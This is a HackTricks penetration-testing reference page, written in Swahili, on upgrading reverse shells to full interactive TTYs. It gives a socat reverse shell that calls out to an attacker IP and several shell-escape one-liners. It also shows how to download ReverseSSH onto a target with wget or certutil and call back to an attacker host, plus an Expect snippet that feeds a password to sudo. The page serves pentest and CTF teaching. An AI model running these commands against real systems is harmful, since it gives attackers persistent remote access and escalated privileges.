# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

`/etc/shells` huorodhesha pathnames halali za login-shell na hutumiwa na baadhi ya programs; si sharti la jumla kila mara la ku-allocate PTY.<sup>[[3]](#references)[[4]](#references)</sup> Ikiwa program kama `pkexec` inakataa `SHELL` kwa ujumbe `The value for the SHELL variable was not found in the /etc/shells file`, hakikisha shell path kamili, kwa mfano `/bin/bash`, ipo kwenye `/etc/shells`.<sup>[[10]](#references)</sup> Mlolongo wa urejeshaji wa `CTRL+Z`/`fg` hapa chini hutumia Bash job control; ikiwa shell ya sasa si Bash, anzisha Bash kabla ya kutumia mlolongo huo.<sup>[[7]](#references)</sup>

#### Python

Python's `pty.spawn` huanzisha program iliyounganishwa na streams za standard input, output, na error za process ya sasa, jambo linaloipa Bash pseudo-terminal katika session hii.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Unaweza kupata **idadi** ya **mistari** na **safu** kwa kuendesha **`stty -a`**; `-a` huchapisha mipangilio yote ya sasa ya terminal. Matokeo ya amri hiyo hutegemea terminal, kwa hivyo tumia thamani zilizoripotiwa na session ya sasa.<sup>[[11]](#references)</sup>

#### script

Utility ya `script` hurekodi session ya terminal; hapa `/dev/null` hutupa typescript, `-q` hukandamiza ujumbe wa kuanza na kukamilika, na `-c` huendesha Bash badala ya shell ya kawaida.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Baada ya kutumia mojawapo ya mbinu za PTY-spawn, simamisha session ya Netcat na uirejeshe kwa local raw mode, kisha weka mazingira na vipimo vya terminal ya remote:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

The listener hutumia terminal ya sasa katika raw mode huku local echo ikiwa imezimwa na hukubali miunganisho ya TCP kwenye port 4444. Amri ya victim huweka pty, huunganisha stderr, huunda session, forwards SIGINT, na kutumia mipangilio salama ya terminal; ongeza `ctty` ikiwa child anahitaji controlling terminal.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (old versions with `--interactive`): `!sh`

Nmap escape inategemea version: Nmap iliondoa mode yake ya `--interactive` katika matoleo ya baadaye, kwa hivyo `!sh` inatumika tu kwa matoleo ya zamani.<sup>[[13]](#references)</sup>

## ReverseSSH

Njia rahisi ya kupata **interactive shell access**, pamoja na **file transfers** na **port forwarding**, ni kuweka statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) kwenye target.<sup>[[1]](#references)</sup>

Hapa chini kuna mfano wa `x86` unaotumia binary iliyobanwa kwa UPX na kuchapishwa na mradi. Kwa architectures nyingine au release artifacts, tumia [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) kwa mwongozo.<sup>[[1]](#references)</sup>

1. Andaa local host ili ipokee incoming SSH connection. Katika listener mode, `-l` huwezesha listener na `-p 4444` huchagua port ambayo inakubali connection ya target.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target. Hamisha artifact hiyo hiyo ya `upx_reverse-sshx86` hadi `/dev/shm/reverse-ssh` na uifanye iwe executable. `-p 4444` ya target huchagua listener port iliyo hapo juu, na `kali@10.0.0.2` hutoa account na host zinazotumika kuanzisha muunganisho wa kurudi nyumbani.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows target. Full interactive PowerShell requires Windows 10 build 17763; see the [project README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Mfano wa Windows hutumia `certutil` pamoja na `-f -urlcache`; Microsoft inaeleza `-f` kama kulazimisha URL fetch na inabainisha kuwa parameters zinazopatikana hutofautiana kulingana na version, kwa hivyo angalia `certutil -?` ikiwa muundo huu haupatikani.<sup>[[12]](#references)</sup>

- Baada ya reverse connection kufanikiwa, reverse-mode listener ya ReverseSSH hufunga port `8888` kwa default (au value iliyotolewa kwa `-b`), na connections zinazoingia hukubali username yoyote ikiwa na password ya default `letmeinbrudipls`. Remote shell huendeshwa kwa privileges za account iliyoanzisha `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) hu-upgrade kiotomatiki reverse shells za Unix-like kuwa PTY, hurekebisha ukubwa wa terminals za Unix-like, na kurekodi mwingiliano wa shell; kwa Windows shells hutoa readline lakini si real-time terminal resizing.<sup>[[2]](#references)</sup>

![Kiolesura cha Penelope cha kushughulikia reverse shell](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

Endesha `penelope` ili kusikiliza kwenye `0.0.0.0:4444` kwa chaguo-msingi; Unix-like shells zinazoingia zinaweza kisha ku-upgrade na kurekodiwa kiotomatiki.<sup>[[2]](#references)</sup>

![Penelope ikishughulikia na ku-upgrade shell inayoingia](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Ikiwa kwa sababu fulani huwezi kupata full TTY, **bado unaweza kuingiliana na programs** zinazotarajia input ya mtumiaji. Katika mfano ufuatao, Expect huanzisha `sudo`, husubiri password prompt yake, hutuma password, na kurudisha udhibiti kwa kutumia `interact`; `sudo -S` husoma password yake kutoka standard input. Tumia hii tu katika lab iliyoidhinishwa na epuka kuweka credentials halisi kwenye shell history au source files.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - Seva ya ssh iliyounganishwa statically yenye utendaji wa reverse shell kwa CTFs na kadhalika](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler inayofanya baadhi ya mambo kiotomatiki ili kurahisisha maisha](https://github.com/brightio/penelope)
- [3] [shells(5) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Nyaraka za Python](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Mwongozo wa Marejeo wa Bash — Udhibiti wa Kazi](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Kumbukumbu ya Mabadiliko ya Nmap](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
